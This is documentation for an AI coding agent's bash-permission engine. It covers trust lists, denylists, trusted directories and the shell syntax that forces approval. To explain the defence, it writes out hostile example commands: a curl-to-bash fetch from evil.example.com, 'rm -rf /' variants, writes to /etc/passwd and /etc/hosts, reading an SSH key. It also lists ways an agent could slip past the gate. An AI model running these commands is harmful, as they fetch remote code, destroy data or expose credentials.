# Bash Command Restrictions

Sqowe Pilot gates every bash command the agent tries to run through a
small decision engine so you can decide which commands auto-run and
which require explicit approval. This document describes exactly how
that engine works, how to configure it, and the edge cases that caused
people the most confusion in practice.

---

## Quick summary

| You see                                                          | What's happening                                                                                                                                                                                                 |
| ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Command ran without a prompt (green check)                       | Every sub-command matched a **Trusted** pattern.                                                                                                                                                                 |
| "Permission Required" dialog appeared                            | At least one sub-command was not trusted, or a denylist match fired, or the command used shell syntax we can't safely parse, or it visibly writes outside your trusted directories. The dialog names the reason. |
| You configured the lists but the dialog still appears constantly | Most common cause: a pipeline like `cat foo \| jq .bar \| head` where the tail filters (`jq`, `head`) are not in your trust list. See [Pipelines and chained commands](#pipelines-and-chained-commands).         |

---

## Where to configure

Settings → **Bash Commands**.

Three fields, one entry per line:

- **Trusted commands** — prefix patterns with `*` as a wildcard. Matching commands run without a prompt.
- **Denylist (force approval)** — substring patterns. Matching commands always prompt, even if they also match the trusted list.
- **Trusted directories** — directories the agent may write to without being asked. See
  [Trusted directories](#trusted-directories). Independent of the two lists: it has its own
  on/off (empty = off) and also covers the `write` and `edit` tools.

When either list has any entry, **authoritative mode** is on. The two
lists become the complete bash policy; the default "ask for bash" rule
is not consulted. When both are empty, bash commands fall through to
the default permission rule.

---

## The shipped defaults

A fresh install starts with these lists in place — they are written into the
config file on the first launch:

| Field            | Value                                                                                                                                                                                                                       |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Trusted commands | `*`                                                                                                                                                                                                                         |
| Denylist         | 52 patterns: privilege escalation, destructive file operations, ownership changes, process and system control, remote access, network downloads and inline shells, installing software, destructive git, Windows destroyers |
| Trusted dirs     | `./`, `/tmp`, `~/tmp`                                                                                                                                                                                                       |

An install that already has its own lists keeps them: the values in the
config file win over the shipped defaults, so nothing is overwritten.

**What that means in practice.** The trust list is `*`, so it does not
narrow anything down — the denylist and the trusted directories are the
barriers:

- a command on the denylist always prompts (`sudo rm -rf /`, `git push`,
  `npm install`, `chmod 777 /`);
- a command that visibly writes outside `./`, `/tmp` and `~/tmp` prompts
  (`echo x > /etc/hosts`, `cat f | tee /etc/passwd`);
- shell syntax the scanner cannot read safely prompts as well (command
  substitution, subshells, a lone `&`);
- everything else runs without a prompt.

Two limits worth knowing. The denylist cannot see inside a program:
`python3 script.py` that deletes files is not a denied pattern, and the
trusted-directories check only sees the writes that are visible in the
command text. And a denylist pattern is matched against the whole
sub-command, quotes included — `echo "install docs"` matches `install` and
asks.

To start over, empty both lists in Settings → Bash Commands: with both
empty the engine has no opinion and the default "ask for bash" rule applies
again.

---

## The decision, step by step

For each bash command the agent requests, the engine runs these checks
in order. The first check that produces a decision wins.

1. **Lists opt-in gate.** If both lists are empty, the engine returns
   "no opinion" and the default rule handles it. Stop.
2. **Unsupported shell syntax guard.** If the command contains any
   construct that the scanner can't safely read, the engine
   returns "ask". This fails closed: unknown shape → manual approval.
   (Details below.)
3. **Split into sub-commands** on unquoted `&&`, `||`, `;`, `|`, and on
   unquoted line breaks. Each piece is evaluated independently. A
   here-document body stays with the command that opened it.
4. **Denylist check** on each sub-command. Word-boundary match,
   case-insensitive. If any sub contains a denylist entry as a distinct
   word → "ask". The denylist always wins; a trusted sub with a
   denylist match still asks.
5. **Trust check** on each sub-command. Prefix match with `*` as
   wildcard, case-insensitive. If every sub matches some trusted
   pattern and none matched the denylist → "allow". Otherwise → "ask".
6. **Trusted directories** (only when that list is non-empty, and only if
   the steps above did not already ask). If the command visibly writes
   outside the listed directories → "ask". This step can only add a
   prompt; it never turns an "ask" into "allow". It also runs when both
   lists are empty. See [Trusted directories](#trusted-directories).

Steps 2–5 read the command through one scanner
(`src/shared/bash-restrictions/scan.ts`), and step 6 reads the same result —
so the guard, the splitter and the write check cannot disagree about what a
command says.

If the agent session had an earlier "Allow always" click for the bash
tool, the bash list engine runs **before** that memory, so your
denylist still applies in the same session.

---

## Pattern semantics

Same `*` glyph, different meanings in the two lists:

### Trusted commands: prefix with wildcard

- Anchored at the start of the sub-command.
- `*` matches any sequence of characters.
- Other regex metacharacters are treated literally (`.`, `(`, `)`,
  `[`, `]`, `+`, `?`, `^`, `$`, `{`, `}`, `|`, `\`).
- Case-insensitive.
- A literal space in the pattern must be present in the command. `ls *`
  compiles to `^ls .*`, so it matches `ls -la` but **not** bare `ls` — the
  space after `ls` is required. To also auto-allow the argument-less form, add
  `ls` as its own pattern.

Examples:

| Pattern       | Matches                                    | Does NOT match                      |
| ------------- | ------------------------------------------ | ----------------------------------- |
| `ls *`        | `ls -la`, `ls /tmp`, `LS -la`              | `ls` (bare, no arg), `xls`, `my-ls` |
| `npm run *`   | `npm run build`, `npm run test --watch`    | `npm install`, `yarn run build`     |
| `git status`  | `git status`, `git status --short`         | `git statu`, `cd && git status`\*   |
| `./configure` | `./configure`, `./configure --prefix=/opt` | `a/configure` (literal `.`)         |

\*`cd && git status` is a chain — each piece is checked separately. The
`git status` piece matches, but `cd` must also match a trusted pattern.

### Denylist: word-boundary match

- Matches when the pattern appears as a distinct word in the
  sub-command — not surrounded by alphanumeric or underscore characters.
- `*` is a **literal asterisk**, not a wildcard.
- Case-insensitive.
- For flag-style patterns starting with `-` (like `--force`), only the
  left boundary is enforced, so `--force` also catches
  `--force-with-lease`.

This means `rm` matches the command `rm -rf /tmp`, `/usr/bin/rm foo`,
or `(rm file)` but does **not** match `--scrape-formats markdown`
(where "rm" is embedded inside "formats"). No more trailing-space
hacks needed.

Examples:

| Denylist entry | Matches                                                    | Does NOT match                                   |
| -------------- | ---------------------------------------------------------- | ------------------------------------------------ |
| `rm`           | `rm file.txt`, `xargs rm -rf`, `/usr/bin/rm foo`, `(rm x)` | `formats`, `markdown`, `firmware`, `confirm_it`  |
| `--force`      | `git push --force`, `git push --force-with-lease`          | `--reinforce`, `workforce`                       |
| `sudo`         | `sudo apt install`, `/usr/bin/sudo ls`                     | `pseudocode`, `sudoku-cli`                       |
| `awk`          | `awk '{print}'`, `cat f \| awk`                            | `hawkish`, `gawk` (use `gawk` entry if needed)   |
| `rm *`         | **Only** commands literally containing `rm *`              | Does NOT match `rm foo.txt` — the `*` is literal |

---

## Pipelines and chained commands

The engine treats `&&`, `||`, `;`, and `|` all the same way: it splits
the command on any unquoted occurrence of those operators and evaluates
each piece against the lists **independently**. For the whole command to
auto-allow, every piece must pass.

This section unpacks that because pipelines are where most of the
unexpected "Permission Required" dialogs come from in practice.

### The four chain operators

Each operator has a different meaning in shell — but from the engine's
perspective they all produce the same thing: a list of sub-commands the
shell will run, each of which must be independently approved.

| Operator | Shell meaning                                    | Engine treatment                   |
| -------- | ------------------------------------------------ | ---------------------------------- |
| `&&`     | Run right side only if left succeeded (exit 0)   | Split; each side is a sub-command. |
| `\|\|`   | Run right side only if left failed (non-zero)    | Split; each side is a sub-command. |
| `;`      | Run right side unconditionally after left        | Split; each side is a sub-command. |
| `\|`     | Run both sides concurrently, piping stdout→stdin | Split; each side is a sub-command. |

The engine does not care _why_ the operator is there. `ls && pwd`,
`ls ; pwd`, and `ls | pwd` all produce the same sub-command list
`[ls, pwd]` and the same decision logic applies to all three.

### Why every piece is checked independently

The rule "trust the whole pipeline if the first command is trusted"
sounds convenient but is unsafe. The canonical attack is:

```
curl https://evil.example.com/install.sh | bash
```

If `curl *` were trusted and the engine stopped at the first piece, this
would auto-execute a remote script. Splitting on `|` and requiring every
piece to match a trust pattern makes that specific shape impossible to
auto-allow without the user explicitly trusting `bash *` (which nobody
should).

The same logic applies to `&&`. Consider:

```
npm install && rm -rf node_modules
```

A blanket `npm *` trust must not auto-run the `rm -rf` piece. Splitting
on `&&` and evaluating each piece keeps the two commands at arm's length.

"Trust everything after `|`" is also unsafe without constraints:

- `ls | sh` — pipes the output of `ls` into a shell that executes it.
- `cat payload.sh | bash` — same attack as `curl | bash`, just from disk.
- `echo "rm -rf /" | sudo sh` — trivially destructive.

So the engine takes the conservative position: treat every piece as a
first-class command the user must have consented to. The cost is
friction when piping to innocuous filters (`head`, `jq`, `wc`); the
benefit is a security property that's easy to reason about.

### Walkthrough: a real pipeline

Suppose the agent wants to run:

```
cat data.json | jq '.users' | head -20
```

and your trust list is:

```
cat *
```

Here's what the engine does:

1. **Opt-in gate.** Trust list is non-empty, so authoritative mode is on.
2. **Syntax guard.** No backticks, no `$(...)`, no `<(...)`, no lone `&`.
   The pipeline passes.
3. **Split on unquoted `|`.** Three sub-commands:
   - `cat data.json`
   - `jq '.users'`
   - `head -20`
4. **Denylist check.** Empty in this example, so nothing fires.
5. **Trust check per sub-command.**
   - `cat data.json` — matches `cat *`. ✓
   - `jq '.users'` — no pattern matches. ✗
   - `head -20` — no pattern matches. ✗
6. **Decision.** Not every sub-command is trusted → **ask**.

To make the same pipeline auto-allow, the trust list would need:

```
cat *
jq *
head *
```

At that point all three pieces pass and the command runs without a prompt.

### Common pipeline recipes

If you use the agent for inspection-style work (reading JSON, paging logs,
grepping output) these filters come up constantly. Add the ones you
actually use; leave out the ones you don't — each extra entry is a small
expansion of the trust surface.

```
# Starter pack for pipeline-heavy work
cat *
head *
tail *
wc *
sort *
uniq *
cut *
tr *
column *
grep *
rg *
jq *
awk *
sed *
```

A few notes on that list:

- `awk` and `sed` are on it because they're ubiquitous in pipelines, but
  both can write files or shell out (`awk 'BEGIN{system("rm -rf /")}'`,
  `sed -i 's/a/b/' file`). If your threat model cares, add denylist
  entries like `system(`, `-i `, `--in-place` to force approval on those
  forms.
- `xargs` is **not** on the list — it executes whatever it receives on
  stdin as a command. Treat it as "runs arbitrary commands", not as a
  filter. Add it to trust only if you genuinely need it.
- `tee` is **not** on the list — it writes files. Add it explicitly if
  you want to allow output-teeing, and consider whether to denylist
  destructive paths.

### Pipes that still ask

Some programs look like pipeline filters but aren't read-only, and a few
shapes of the pipe itself keep asking regardless of your trust list.

| Shape                         | Why it keeps asking                                                                                                                              |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `... \| sh` / `... \| bash`   | The tail is a shell interpreter; the content piped into it comes from somewhere and can be anything. Never auto-allow unless you mean to.        |
| `... \| xargs <cmd>`          | `xargs` executes `<cmd>` with stdin-derived arguments. Effectively runs arbitrary commands. The `xargs <cmd>` piece needs its own trust entry.   |
| `... \| sudo <cmd>`           | `sudo` is in the recommended denylist. Denylist always wins, so even a fully-trusted pipeline asks.                                              |
| `... \| tee file`             | `tee` writes files. Not destructive by itself, but worth keeping manual unless you've scoped the paths.                                          |
| `... \| sed -i 's/a/b/' file` | `sed -i` modifies files in place. The piece `sed -i 's/a/b/' file` will match `sed *` if present; denylist `-i ` (trailing space) to force asks. |
| `cmd \| $(other)`             | Command substitution anywhere in the command forces ask — the syntax guard catches it before the split.                                          |
| `cmd1 \| cmd2 &`              | Trailing lone `&` (background operator) is caught by the syntax guard and always asks.                                                           |

The engine does not special-case `sh`, `bash`, `xargs`, or `tee`; they're
only "dangerous tails" in the sense that trusting them is nearly
equivalent to trusting every command. The recommendation is to keep them
out of the trust list and let them prompt each time.

### Quoted operators

Operators inside quoted strings are preserved — the engine treats
`echo "a && b"` as a single sub-command `echo "a && b"`, not as two.
Same for single quotes, pipes, and semicolons. This matches bash
semantics: bash doesn't re-parse quoted contents as operators either.

```
echo "a && b"        → [echo "a && b"]
echo 'cat | head'    → [echo 'cat | head']
grep "a;b" file      → [grep "a;b" file]
```

### FD redirection near pipes

File-descriptor redirections like `2>&1` are recognized by the syntax
guard and let through. So `cmd 2>&1 | head` splits cleanly into
`cmd 2>&1` and `head`, each evaluated normally.

### Practical consequence

Trust lists tuned for single commands do not transfer to pipelines.
Concretely:

| Your trust list                   | `git status` | `git status \| head -20` | Why                                               |
| --------------------------------- | ------------ | ------------------------ | ------------------------------------------------- |
| `git status*`                     | allow        | ask                      | Second piece `head -20` isn't covered.            |
| `git status*`, `head *`           | allow        | allow                    | Both pieces match.                                |
| `git *`                           | allow        | ask                      | Same reason — the pipeline tail is still the gap. |
| `git *`, `head *`, `jq *`, `wc *` | allow        | allow                    | Any tail filter covered by the second set passes. |

The rule of thumb: **trust the commands you want to run, then trust the
small set of filters you want to pipe them into**. The filter list is
short and mostly stable across projects; the command list is where your
per-project customization lives.

---

## Shell syntax that always asks

These constructs force "ask" regardless of the lists, because the
simple parser can't prove the command doesn't smuggle something in:

| Construct            | Example                     | Why                                                           |
| -------------------- | --------------------------- | ------------------------------------------------------------- |
| Command substitution | `echo $(date)`, `cat \`x\`` | A trusted outer command could execute an untrusted inner one. |
| Process substitution | `diff <(cmd1) <(cmd2)`      | Inner commands run in a subshell.                             |
| Subshell             | `(cmd)`, `((cmd); other)`   | Commands run in a subshell.                                   |
| Lone background `&`  | `sleep 60 &`, `cmd >1&`     | Detaches the command from our control.                        |
| Unclosed quotes      | `echo "unterminated`        | Parse is ambiguous.                                           |
| Carriage return      | `cmd1\r\ncmd2`              | Not a line break the shell splits on.                         |
| `$'…'` / `$"…"`      | `echo x > $'/etc/hosts'`    | The shell rewrites the string before using it; see below.     |

A line break is **not** on this list — it separates commands like `;`. A few
multi-line shapes still ask; see
[Multi-line commands and here-documents](#multi-line-commands-and-here-documents).

Backticks and `$(...)` are scanned for **even inside double quotes**,
because bash expands them there. Single-quoted substrings are fully
inert.

`$'…'` (ANSI-C quoting) and `$"…"` (locale quoting) ask because the shell
turns them into something else before the command runs: `$'/etc/hosts'` _is_
`/etc/hosts`, and `$'\''` is a single quote character. Read as "a `$` and then
a quoted string" they would name a file that the shell never touches, and an
escaped quote inside would shift where every later quote begins and ends.
Inside double quotes the two forms are not special and do not ask.

`$((expr))` and `((expr))` are arithmetic and allowed — but only when they
really close with `))`. Bash reads `$((cmd) | other)` as a command
substitution and `((cmd); other)` as a subshell, and runs `cmd`; both ask.

---

## Shell syntax that's allowed through

These look similar to the "always ask" list but are actually safe
redirections — they duplicate or close file descriptors, they don't
chain commands or spawn subshells. The engine recognizes them and lets
the trust list decide:

| Form       | Meaning                          | Example           |
| ---------- | -------------------------------- | ----------------- |
| `N>&M`     | Duplicate fd N onto M            | `cmd 2>&1`        |
| `N>&-`     | Close fd N                       | `cmd 2>&-`        |
| `>&N`      | Short for `1>&N`                 | `printf x >&2`    |
| `&> file`  | Both stdout and stderr to file   | `cmd &> out.log`  |
| `&>> file` | Both stdout and stderr appending | `cmd &>> out.log` |

**History note:** earlier versions of the engine flagged every `&` as
the background operator, which broke common shapes like `cmd 2>&1 \|
head`. Fixed; the scanner now distinguishes redirection from
backgrounding.

---

## Multi-line commands and here-documents

An unquoted line break separates commands exactly like `;`. Each line is then
checked against the lists on its own:

```
cd build
ls -la          → [cd build] [ls -la]   — same as `cd build ; ls -la`
```

This used to ask unconditionally. That prompt added no protection — the same
commands joined by `;` already went through the normal checks — so it was
removed. Line breaks inside quotes do not split (`python3 -c '…'` over several
lines is one command), and a backslash at the end of a line joins it to the next.

### Here-documents

```
python3 - <<'PY'
import os
print(os.getcwd())
PY
```

- The body belongs to the command that opened it. Its lines are **data**, not
  commands: only `python3 - <<'PY'` has to be trusted.
- **The denylist is matched against the body too.** Otherwise
  `bash <<'EOF'` + `rm -rf ~/Documents` + `EOF` would pass a broad trust list
  although `bash -c 'rm -rf ~/Documents'` asks. The cost: a denied word in
  script text prompts (`.find(` with `find` denied). Narrower entries avoid
  it — `find /` still catches `find / -name x` but not `.find(`.
- Whatever follows the terminator line is a normal command again, and the rest
  of the opening line still counts (`cat <<EOF | sh` → `sh` must be trusted).
- `<<-` (tab-indented terminator) is supported. The one-line here-string
  `<<<` was never affected.

A here-document asks when:

| Shape                                                              | Why                                                                                                     |
| ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
| No terminator line (also: indented without `<<-`, trailing spaces) | The shell would keep reading; what follows is not commands.                                             |
| Unquoted delimiter and `$(...)` or backticks in the body           | The shell runs them while expanding the body. Quote the delimiter (`<<'EOF'`) to make the body literal. |
| More than one here-document on a line                              | Not supported yet.                                                                                      |
| A delimiter that is empty or not a plain word                      | Cannot be read reliably.                                                                                |

### Comments

- A line that starts with `#` in a multi-line command is dropped. It is not
  executed, so the lists are not applied to it.
- A `#` comment that starts **inside** a line and is followed by more lines
  asks. A quote character in such a comment could otherwise hide the lines
  after it from the check:

  ```
  ls   # don't
  echo x >> ~/.zshrc   # it's
  ```

- In a one-line command `#` is ordinary text, as before.
- A line break inside `${ … }` asks.

---

## Trusted directories

A list of directories the agent may write to without being asked. Empty list =
the check is off. Typical value:

```
./
/tmp
```

It governs two things:

1. **`write` and `edit` tools.** A target inside a listed directory runs
   without a prompt; anything else asks.
2. **Bash — the places a command _visibly_ writes.** Output redirections
   (`>`, `>>`, `&>`, `&>>`, `2>`, `<>`, `>&file`) and the operands of `tee`.

For bash it only **adds** a condition: a command still has to pass the two
lists, and a directory never makes an untrusted command trusted.

| Command (with `./` and `/tmp` trusted, `*` in the trust list) | Result                                |
| ------------------------------------------------------------- | ------------------------------------- |
| `echo x > out.txt`, `echo x > /tmp/a.txt`                     | allow                                 |
| `echo x >> ~/.zshrc`                                          | ask — outside                         |
| `cd /etc && echo x > hosts`                                   | ask — outside                         |
| `make \| tee /var/log/build.log`                              | ask — outside                         |
| `echo x > "$OUT/file"`                                        | ask — target cannot be determined     |
| `cmd > /dev/null 2>&1`                                        | allow — no file involved              |
| `python3 script.py` (writes wherever it likes)                | allow — **not visible from the text** |

### How entries are read

| Entry                    | Means                                                   |
| ------------------------ | ------------------------------------------------------- |
| `./`, `out/cache`        | relative to the session's working directory (workspace) |
| `~/work`                 | under your home directory                               |
| `/tmp`, `/Users/me/data` | as written                                              |

Both the entry and the target are resolved to their **real path** before they
are compared, so a full path and a relative one to the same file are the same
thing, and a symbolic link inside the project that leads outside counts as
outside.

Entries that are **not accepted** (the check stays on; with nothing accepted,
every write asks):

- the file-system root, your home directory, or a directory that contains it —
  including `./` when the session runs in the home directory;
- in the standalone `pi` extension: a directory outside the project listed in
  the **project** file (list those in the global file instead).

### What always asks

- **The permission settings files themselves** — the project and global
  `bash-restrictions.json` in `pi`, the app's settings file in the app — even
  inside a trusted directory. Otherwise the agent could loosen its own rules.
- A target that cannot be determined: a variable other than `$HOME` / `$PWD`,
  a wildcard, `~user`, a missing target.
- A relative target after a directory change that cannot be followed:
  `cd "$DIR"`, `cd -`, `pushd`, a `cd` inside a function or an `if`.
- A relative target after `cd dir ;` (or a line break) when it would be
  outside had the `cd` failed. Use `cd dir && …`: then the write only happens
  if the `cd` worked.
- `~` or `$HOME` in a command that itself assigns `HOME`.

### What it does not see

This is a check of visible writes, **not a sandbox**:

- anything a program writes on its own (`python3 script.py`, `npm run …`,
  `sed -i`, `sort -o`, `bash -c '…'`, `eval`);
- path arguments of `cp`, `mv`, `rm`, `mkdir`, `touch`, `ln`, `curl -o`, …;
- a link created and written through in the same command
  (`ln -s /etc x && echo a > x/hosts`);
- reads — `cat ~/.ssh/id_rsa` is not a write.

Keep using the denylist for those. Only isolation by the operating system
closes them completely.

---

## Worked examples

Given this configuration:

```
# Trusted
ls *
cat *
sed *
firecrawl *

# Denylist
--force
sudo
```

| Command                       | Decision | Why                                                                   |
| ----------------------------- | -------- | --------------------------------------------------------------------- |
| `ls -la`                      | allow    | Matches `ls *`. No denylist match.                                    |
| `firecrawl search "foo"`      | allow    | Matches `firecrawl *`.                                                |
| `firecrawl search "foo" 2>&1` | allow    | `2>&1` is FD redirection, not a new command. Single sub matches.      |
| `cat file \| head -100`       | ask      | `cat file` is trusted, but `head -100` is not.                        |
| `cat file \| sed 's/a/b/'`    | allow    | Both subs match (`cat *`, `sed *`).                                   |
| `sudo ls`                     | ask      | Denylist word `sudo` matches. Denylist beats trust.                   |
| `ls --force`                  | ask      | Denylist word `--force` matches.                                      |
| `cat firmware.bin`            | allow    | `rm` denylist does NOT match inside "firmware" (word boundary).       |
| `echo "pseudocode"`           | allow    | `sudo` denylist does NOT match inside "pseudocode" (word boundary).   |
| `git push`                    | ask      | No trusted pattern matches. Authoritative mode → implicit ask.        |
| `echo "hello && world"`       | ask      | `echo` isn't in the trust list. (The `&&` is inside quotes; one sub.) |
| `ls && pwd`                   | ask      | Two subs. `ls` matches, `pwd` doesn't.                                |
| `ls $(rm -rf /)`              | ask      | Command substitution always asks.                                     |
| `cat <(echo hi)`              | ask      | Process substitution always asks.                                     |
| `sleep 60 &`                  | ask      | Lone `&` = background operator.                                       |
| (empty command)               | no-op    | Engine returns null, falls through.                                   |

---

## Interaction with "Allow always"

The per-tool "Allow always" button in the permission dialog stores a
session-scoped memory: "for this session, always allow tool X without
prompting." For the **bash** tool specifically, the list engine runs
_before_ that memory is consulted. This means:

- Clicking "Allow always" on a one-off bash call does **not** blanket-
  allow every future bash command in the session.
- Your denylist keeps biting for the rest of the session.
- Commands that neither match a list entry nor trip the syntax guard
  fall through to the session memory — so if you do click "Allow
  always" and then run something totally unrelated to your lists, that
  unrelated command will still auto-run until the session ends.

For non-bash tools (`write`, `edit`, `read`, etc.) "Allow always"
works as it always did: approving once short-circuits the rules for
the rest of the session.

One exception, when **trusted directories** are configured: a `write` or
`edit` outside them is decided before the session memory, so "Allow always"
on `write` does not cover writes outside the list — each one still asks.
Writes inside the list run without a prompt either way, unless your own rule
for the tool says `deny`.

---

## Startup and IPC details

The main process owns the authoritative cache of both lists. On app
launch, the cache is hydrated from the encrypted on-disk config before
the renderer bootstraps — so a bash call during early startup uses
your configured lists, not an empty default.

When you edit the lists in Settings, the renderer pushes the change
via `settings.update` IPC and the main process sanitizes and persists
it in one step. The two sides never diverge: there's a single
`sanitizeBashCommandList` function used by both the runtime cache and
the config store so an untrusted payload can't bypass either.

---

## Practical recipes

### "Let the agent do file inspection and searches, but not changes"

```
# Trusted
ls *
cat *
grep *
find *
head *
tail *
rg *
wc *

# Denylist
(empty)
```

### "Allow my build pipeline but block destructive ops"

```
# Trusted
npm *
git status*
git diff*
git log*

# Denylist
rm
--force
:force
git push
```

Note the bare `rm` — with word-boundary matching it catches `rm`,
`rm -rf`, `/usr/bin/rm` etc. but won't false-positive on words like
`formats` or `firmware`. `git push` matches `git push`,
`git push --force`, `git push origin`, etc.

### "Research mode: firecrawl plus local JSON inspection"

```
# Trusted
firecrawl *
npx firecrawl *
cat *
jq *
head *
tail *
mkdir *

# Denylist
rm
--force
```

---

## Known limitations

- `*` in the denylist is literal, not a wildcard. (Inconsistent with
  the trust list — noted for a future UX fix.)
- The `{fd}>&N` brace form isn't recognized as redirection and still
  asks. Rare in practice; worth handling if it comes up.
- Pattern matching is case-insensitive by design. If you need
  case-sensitive blocking, you'll need to include both cases as
  separate denylist entries.
- `>|` (overwrite despite `noclobber`) is still split at the `|`, as before:
  the piece after it must be trusted on its own, and with trusted directories
  on the command asks.
- A trailing `# comment` on a line of a multi-line command asks (see
  [Comments](#comments)). Put comments on their own lines.
- On Windows (Git Bash), a write target such as `/tmp/x` or `/etc/x` cannot be
  mapped to a real Windows path and asks; drive forms (`/c/…`, `C:/…`) work.
- Trusted directories check visible writes only — see
  [What it does not see](#what-it-does-not-see).

---

## Standalone pi CLI

The same engine is available outside the Electron app as a drop-in extension
for the standalone [`pi`](https://www.npmjs.com/package/@earendil-works/pi-coding-agent)
coding CLI. It gates the agent's `bash` tool through the identical
`decideBashPermission` engine and settings schema (shared from
`src/shared/bash-restrictions/`), so trust/denylist/timeout behaviour matches
the app exactly. With `trustedDirectories` set it also checks the `write` and
`edit` tools — which in `pi` otherwise run with no prompt at all.
Configuration is a JSON file (`~/.pi/agent/bash-restrictions.json`
globally and/or `.pi/bash-restrictions.json` per project) instead of the
Settings UI.

See [pi-extensions/bash-restrictions/README.md](pi-extensions/bash-restrictions/README.md)
for install, config format, and the interactive/headless behaviour table.

---

## Where the code lives

- Command scanner (pure — the only reader of command text):
  `src/shared/bash-restrictions/scan.ts` (`scanBashCommand`)
- Decision engine (pure): `src/shared/bash-restrictions/engine.ts`
  (`decideBashPermission`, `explainBashPermission`, `splitBashSubCommands`,
  `containsUnsupportedShellSyntax`, `matchesTrustedPrefix`,
  `matchesDenylistPattern`)
- Trusted directories for bash: `src/shared/bash-restrictions/write-zone.ts`
  (`checkBashWriteZone`, `decideBashWithZone`, `describeBashReason`)
- Trusted directories — paths, zone, `write` / `edit`:
  `src/shared/path-permissions/` (`buildWriteZone`, `decideWriteToolZone`,
  `resolveToolPath`, `realpathExistingPortion`, `isPathWithinRoot`)
- Settings schema & normalizers: `src/shared/bash-restrictions/settings.ts`
  (`sanitizeBashCommandList`, `sanitizeTrustedDirectories`,
  `normalizePermissionTimeout`, `sanitizeBashRestrictionsSettings`)
- Main-process state & 1-arg wrapper: `src/main/config/permission-rules-store.ts`
  (`decideBashPermission`, `decidePermissionDetailed`, `setBashCommandLists`,
  `getBashCommandLists`, `setTrustedDirectories`, `setProtectedWriteFiles`)
- Reason shown in the dialog: `src/shared/permission-reason.ts` (type),
  `src/renderer/components/PermissionDialog.tsx`
- Main-process installation of the permission gate:
  `src/main/claude/agent-runner.ts#installPermissionHook`
- Hook installer (SDK shape detection): `src/main/claude/before-tool-call-hook.ts`
- Settings UI: `src/renderer/components/settings/SettingsBashCommands.tsx`
- Persistence: `src/main/config/config-store.ts`
  (`bashTrustedCommands`, `bashDenylist`, `trustedDirectories` fields)
- Standalone pi CLI extension: `pi-extensions/bash-restrictions/`
  (`extension.ts` mapper, `config.ts` loader, `README.md`)
- Tests: `tests/bash-command-control.test.ts`,
  `tests/denylist-word-boundary.test.ts`,
  `tests/before-tool-call-hook.test.ts`,
  `tests/bash-restrictions-engine.test.ts`,
  `tests/bash-restrictions-settings.test.ts`,
  `tests/pi-bash-extension-config.test.ts`,
  `tests/pi-bash-extension-mapping.test.ts`,
  `tests/pi-bash-extension-build.test.ts`,
  `tests/pi-bash-extension.e2e.test.ts`,
  `tests/bash-restrictions-multiline.test.ts`,
  `tests/bash-restrictions-write-zone.test.ts`,
  `tests/path-permissions-resolve.test.ts`,
  `tests/path-permissions-zone.test.ts`,
  `tests/path-permissions-pi-parity.test.ts`,
  `tests/pi-bash-extension-write-zone.test.ts`,
  `tests/trusted-directories-app-decide.test.ts`
- Design: `docs/design/trusted-directories.md`
